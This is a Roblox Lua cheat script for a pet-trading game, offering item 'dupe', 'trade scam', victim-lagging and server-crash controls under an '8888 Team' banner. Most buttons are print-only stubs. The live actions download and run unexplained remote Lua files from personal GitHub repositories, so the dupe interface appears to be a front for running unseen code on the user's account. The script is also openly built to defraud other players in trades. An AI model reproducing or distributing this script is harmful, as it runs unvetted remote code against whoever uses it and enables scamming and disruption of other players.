local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "[✨SHINY] UPDATE - PSX PRIVATE V3.8", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
        Name = "Info",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
    
     local Section = Tab:AddSection({
        Name = "Status"
    })
    
     Tab:AddLabel("Dupe: Online")

    Tab:AddLabel("Trade Scam: Online")
    
     local Section = Tab:AddSection({
        Name = "Update info"
    })
    
     Tab:AddParagraph("[⚡ANIME] UPDATE","Version 3.7")
     
     local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
     
     local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    Tab:AddButton({
        Name = "(RISK) Start Dupe",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/8888Team/main/info1.lua"))()
          end    
    })
    
    local Section = Tab:AddSection({
        Name = "Dupe Options"
    })
    
    Tab:AddSlider({
        Name = "Select Pets Limits",
        Min = 0,
        Max = 20,
        Default = 1,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "PETS",
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddToggle({
        Name = "Dupe Only Equiped Pets",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
     
     Tab:AddToggle({
        Name = "(RISK) Dupe Gems",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
     
     Tab:AddTextbox({
        Name = "Rename all pets",
        Default = "Text Goes here",
        TextDisappear = true,
        Callback = function(Value)
            print(Value)
        end	  
    })
    
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
	Name = "ON/OFF"
    })
    
    Tab:AddButton({
        Name = "ON",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
        end    
    })
    
    Tab:AddButton({
        Name = "OFF",
        Default = false,
        Callback = function(Value)
            print("button pressed")
        end    
    })
    
    local Section = Tab:AddSection({
        Name = "Trade Scam Options"
    })
    
     Tab:AddSlider({
        Name = "Lag Victim For",
        Min = 0,
        Max = 60,
        Default = 10,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "Seconds",
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddButton({
        Name = "LagTrade",
        Default = false,
        Callback = function(Value)
            print(Value)
        end    
    })
    
    Tab:AddParagraph("Bot-Trade","Coming Soon!")

      local Tab = Window:MakeTab({
        Name = "Others",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
        Name = "Server"
    })
    
     Tab:AddButton({
        Name = "Crash Server",
        Callback = function()
                  print("button pressed")
          end    
    })
    
    Tab:AddButton({
        Name = "Hop Servers",
        Callback = function()
                  print("button pressed")
          end    
    })
    
    local Section = Tab:AddSection({
        Name = "Other Scripts"
    })
    
    Tab:AddButton({
        Name = "Infinite Yields",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
          end    
    })
    
       OrionLib:MakeNotification({
        Name = "8888 Teams Welcome's You!",
        Content = "Version 3.7 ",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    
    
    
     OrionLib:Init()
    
    
    
